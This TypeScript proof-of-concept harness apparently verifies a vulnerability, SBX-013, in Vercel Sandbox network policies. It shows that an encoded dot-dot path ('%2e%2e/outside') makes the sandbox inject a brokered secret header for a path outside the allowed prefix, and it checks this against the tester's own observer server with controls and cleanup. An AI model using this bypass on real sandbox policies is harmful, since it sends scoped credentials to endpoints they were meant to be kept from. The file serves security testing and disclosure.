import "dotenv/config";

import { createHash, randomBytes, randomUUID } from "node:crypto";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { resolve } from "node:path";
import { Sandbox } from "@vercel/sandbox";

const canaryHeader = "x-sbx-harness-canary";
const remoteProbePath = "/tmp/sbx-013/http-probe.mjs";

function sha256(value: string): string {
  return createHash("sha256").update(value).digest("hex");
}

function required(name: string): string {
  const value = process.env[name];
  if (!value) throw new Error(`${name} is required`);
  return value;
}

function explicitCredentials():
  | { token: string; teamId: string; projectId: string }
  | Record<string, never> {
  const token = process.env.VERCEL_TOKEN;
  const teamId = process.env.VERCEL_TEAM_ID;
  const projectId = process.env.VERCEL_PROJECT_ID;
  const count = [token, teamId, projectId].filter(Boolean).length;
  if (count !== 0 && count !== 3) {
    throw new Error("VERCEL_TOKEN, VERCEL_TEAM_ID, and VERCEL_PROJECT_ID must be supplied together");
  }
  return count === 3
    ? { token: token!, teamId: teamId!, projectId: projectId! }
    : {};
}

async function observerAdminRequest(
  observerBaseUrl: string,
  observerAdminKey: string,
  runId: string,
  resource: "action-config" | "actions",
  init?: RequestInit,
): Promise<Response> {
  const headers = new Headers(init?.headers);
  headers.set("authorization", `Bearer ${observerAdminKey}`);
  return fetch(new URL(`/v1/runs/${encodeURIComponent(runId)}/${resource}`, observerBaseUrl), {
    ...init,
    headers,
    signal: AbortSignal.timeout(10_000),
  });
}

async function main(): Promise<void> {
  const startedAt = new Date().toISOString();
  const observerBaseUrl = new URL(required("OBSERVER_BASE_URL")).origin;
  const observerAdminKey = required("OBSERVER_ADMIN_KEY");
  const observerHost = new URL(observerBaseUrl).hostname;
  const runId = randomUUID();
  const correlationCanary = `corr_${randomBytes(18).toString("base64url")}`;
  const brokeredSecret = `broker_${randomBytes(24).toString("base64url")}`;
  const allowedPrefix = `/v1/probe/${runId}/matched/`;
  const rawPath = `${allowedPrefix}%2e%2e/outside`;
  const expectedNormalizedPath = `/v1/probe/${runId}/outside`;
  let sandbox: Sandbox | undefined;
  const cleanup = {
    stopAttempted: false,
    stopped: false,
    deleteAttempted: false,
    deleted: false,
    observerConfigDeleteAttempted: false,
    observerConfigDeleted: false,
    errors: [] as string[],
  };
  let evidence: Record<string, unknown> | undefined;
  let privateObserverEvents: unknown[] = [];

  try {
    const registration = await observerAdminRequest(
      observerBaseUrl,
      observerAdminKey,
      runId,
      "action-config",
      {
        method: "POST",
        headers: { "x-observer-action-secret": brokeredSecret },
      },
    );
    if (!registration.ok) throw new Error(`observer action registration returned ${registration.status}`);

    sandbox = await Sandbox.create({
      name: `sbx-013-poc-${runId.slice(0, 8)}`,
      persistent: false,
      timeout: 300_000,
      networkPolicy: {
        allow: {
          [observerHost]: [
            {
              match: { path: { startsWith: allowedPrefix } },
              transform: [{ headers: { [canaryHeader]: brokeredSecret } }],
            },
          ],
        },
      },
      tags: { harness: "vsc", test: "SBX-013", run: runId.slice(0, 12) },
      ...explicitCredentials(),
    });

    const session = sandbox.currentSession();
    const sandboxIdentity = {
      name: sandbox.name,
      sessionId: session.sessionId,
      sessionCreatedAt: session.createdAt.toISOString(),
      sessionRequestedAt: session.requestedAt.toISOString(),
      region: session.region,
    };
    const guestProbe = await readFile(resolve("guest/http-probe.mjs"), "utf8");
    await sandbox.writeFiles([{ path: remoteProbePath, content: guestProbe, mode: 0o700 }]);
    const activeSandbox = sandbox;
    const guestConfigurationSha256: Record<string, string> = {};

    async function runGuestCase(caseId: string, casePath: string) {
      const guestConfiguration = {
        baseUrl: observerBaseUrl,
        runId,
        testId: "SBX-013-POC",
        caseId,
        canary: correlationCanary,
        method: "GET",
        rawPath: casePath,
        headers: {},
        timeoutMs: 20_000,
      };
      const serializedConfiguration = JSON.stringify(guestConfiguration);
      if (serializedConfiguration.includes(brokeredSecret)) {
        throw new Error("proof invalid: brokered secret entered the guest configuration");
      }
      guestConfigurationSha256[caseId] = sha256(serializedConfiguration);
      const command = await activeSandbox.runCommand({
        cmd: "node",
        args: [remoteProbePath, Buffer.from(serializedConfiguration).toString("base64url")],
        timeoutMs: 25_000,
      });
      const result = JSON.parse(await command.stdout()) as {
        ok: boolean;
        statusCode?: number;
        body?: string;
        error?: string;
      };
      if (!result.ok) throw new Error(`${caseId} failed: ${result.error ?? "unknown probe error"}`);
      return {
        commandExitCode: command.exitCode,
        statusCode: result.statusCode,
        rawBody: result.body ?? "",
        body: result.body ? JSON.parse(result.body) as {
          authorized?: boolean;
          operationId?: string;
          normalizedPath?: string;
        } : undefined,
      };
    }

    const matchedControl = await runGuestCase("matched-control", `${allowedPrefix}control`);
    const outsideControl = await runGuestCase("outside-control", expectedNormalizedPath);
    const encodedDotdot = await runGuestCase("encoded-dotdot", rawPath);

    await new Promise((resolveWait) => setTimeout(resolveWait, 1_500));
    const actionResponse = await observerAdminRequest(
      observerBaseUrl,
      observerAdminKey,
      runId,
      "actions",
    );
    if (!actionResponse.ok) throw new Error(`observer action query returned ${actionResponse.status}`);
    const actionPayload = (await actionResponse.json()) as {
      actions: Array<{
        operationId: string;
        authorizedAt: string;
        caseId: string;
        normalizedPath: string;
      }>;
    };
    const rawEventsResponse = await fetch(
      new URL(`/v1/runs/${encodeURIComponent(runId)}/events`, observerBaseUrl),
      {
        headers: { authorization: `Bearer ${observerAdminKey}` },
        signal: AbortSignal.timeout(10_000),
      },
    );
    if (!rawEventsResponse.ok) throw new Error(`observer event query returned ${rawEventsResponse.status}`);
    const payload = (await rawEventsResponse.json()) as {
      events: Array<{
        caseId: string;
        rawUrl: string;
        normalizedPath: string;
        headers: Record<string, string | string[]>;
        observedAt: string;
      }>;
    };
    privateObserverEvents = payload.events;
    const eventFor = (caseId: string) => {
      const event = payload.events.find((entry) => entry.caseId === caseId);
      if (!event) throw new Error(`observer did not record ${caseId}`);
      return event;
    };
    const headerFor = (caseId: string): string | undefined => {
      const header = eventFor(caseId).headers[canaryHeader];
      return Array.isArray(header) ? header[0] : header;
    };
    const matchedEvent = eventFor("matched-control");
    const outsideEvent = eventFor("outside-control");
    const encodedEvent = eventFor("encoded-dotdot");
    const authorizedAction = actionPayload.actions.find((action) => action.caseId === "encoded-dotdot");
    const controlsPassed =
      matchedControl.statusCode === 204 &&
      headerFor("matched-control") === brokeredSecret &&
      outsideControl.statusCode === 401 &&
      outsideControl.body?.authorized === false &&
      headerFor("outside-control") === undefined &&
      outsideEvent.normalizedPath === expectedNormalizedPath;
    const outOfScopeActionAuthorized =
      encodedDotdot.statusCode === 200 &&
      encodedDotdot.body?.authorized === true &&
      encodedDotdot.body.operationId !== undefined &&
      encodedDotdot.body.operationId === authorizedAction?.operationId &&
      headerFor("encoded-dotdot") === brokeredSecret &&
      encodedDotdot.body.normalizedPath === expectedNormalizedPath &&
      encodedEvent.normalizedPath === expectedNormalizedPath &&
      actionPayload.actions.length === 1;
    const guestResponseContainsBrokeredSecret = [
      matchedControl.rawBody,
      outsideControl.rawBody,
      encodedDotdot.rawBody,
    ].some((body) => body.includes(brokeredSecret));
    if (!controlsPassed) throw new Error("positive or negative control failed");
    if (!outOfScopeActionAuthorized) {
      throw new Error("encoded path did not authorize the normalized outside action");
    }
    if (guestResponseContainsBrokeredSecret) {
      throw new Error("proof invalid: the action endpoint disclosed the brokered secret");
    }

    evidence = {
      schemaVersion: 2,
      testId: "SBX-013",
      runId,
      startedAt,
      completedProbeAt: new Date().toISOString(),
      runtime: {
        sandboxSdk: "@vercel/sandbox@3.0.0",
        controllerNode: process.version,
        observerRouting: "Node.js WHATWG URL parser: new URL(request.url, base).pathname",
      },
      sandbox: sandboxIdentity,
      outOfScopeActionAuthorized,
      controlsPassed,
      guestConfigurationContainsBrokeredSecret: false,
      guestResponseContainsBrokeredSecret,
      guestConfigurationSha256,
      rawPath,
      observerRawUrl: encodedEvent.rawUrl,
      observerNormalizedPath: encodedEvent.normalizedPath,
      expectedNormalizedPath,
      matchedControl: {
        rawUrl: matchedEvent.rawUrl,
        normalizedPath: matchedEvent.normalizedPath,
        brokeredHeaderPresent: headerFor("matched-control") === brokeredSecret,
        statusCode: matchedControl.statusCode,
      },
      outsideControl: {
        rawUrl: outsideEvent.rawUrl,
        normalizedPath: outsideEvent.normalizedPath,
        brokeredHeaderPresent: headerFor("outside-control") !== undefined,
        statusCode: outsideControl.statusCode,
        actionAuthorized: outsideControl.body?.authorized,
      },
      encodedDotdot: {
        rawUrl: encodedEvent.rawUrl,
        normalizedPath: encodedEvent.normalizedPath,
        observedAt: encodedEvent.observedAt,
        brokeredHeaderPresent: headerFor("encoded-dotdot") === brokeredSecret,
        statusCode: encodedDotdot.statusCode,
        actionAuthorized: encodedDotdot.body?.authorized,
        operationId: encodedDotdot.body?.operationId,
        authorizedAt: authorizedAction?.authorizedAt,
      },
      correlationCanarySha256: sha256(correlationCanary),
      controllerBrokeredSecretSha256: sha256(brokeredSecret),
      observerBrokeredSecretSha256: sha256(headerFor("encoded-dotdot") ?? ""),
      commandExitCodes: {
        matchedControl: matchedControl.commandExitCode,
        outsideControl: outsideControl.commandExitCode,
        encodedDotdot: encodedDotdot.commandExitCode,
      },
    };
  } finally {
    if (sandbox) {
      cleanup.stopAttempted = true;
      try {
        await sandbox.stop();
        cleanup.stopped = true;
      } catch (error) {
        cleanup.errors.push(`stop: ${error instanceof Error ? error.message : String(error)}`);
      }
      cleanup.deleteAttempted = true;
      try {
        await sandbox.delete();
        cleanup.deleted = true;
      } catch (error) {
        cleanup.errors.push(`delete: ${error instanceof Error ? error.message : String(error)}`);
      }
    }
    cleanup.observerConfigDeleteAttempted = true;
    try {
      const deletion = await observerAdminRequest(
        observerBaseUrl,
        observerAdminKey,
        runId,
        "action-config",
        { method: "DELETE" },
      );
      cleanup.observerConfigDeleted = deletion.status === 204;
      if (!cleanup.observerConfigDeleted) cleanup.errors.push(`observer config delete: HTTP ${deletion.status}`);
    } catch (error) {
      cleanup.errors.push(`observer config delete: ${error instanceof Error ? error.message : String(error)}`);
    }
  }

  if (!evidence) throw new Error("PoC completed without producing evidence");
  const artifactsDirectory = resolve(process.env.HARNESS_ARTIFACTS_DIR ?? "./artifacts");
  await mkdir(artifactsDirectory, { recursive: true, mode: 0o700 });
  const evidencePath = resolve(artifactsDirectory, `SBX-013-poc-${runId}.json`);
  const privateEvidencePath = resolve(artifactsDirectory, `SBX-013-poc-${runId}-private.json`);
  const finalEvidence = { ...evidence, completedAt: new Date().toISOString(), cleanup };
  await writeFile(evidencePath, `${JSON.stringify(finalEvidence, null, 2)}\n`, { mode: 0o600 });
  await writeFile(
    privateEvidencePath,
    `${JSON.stringify({ ...finalEvidence, observerEvents: privateObserverEvents }, null, 2)}\n`,
    { mode: 0o600 },
  );
  process.stdout.write(`${JSON.stringify({ ...finalEvidence, evidencePath, privateEvidencePath }, null, 2)}\n`);
  if (cleanup.errors.length > 0) {
    throw new Error(`cleanup failed: ${cleanup.errors.join("; ")}`);
  }
}

await main();
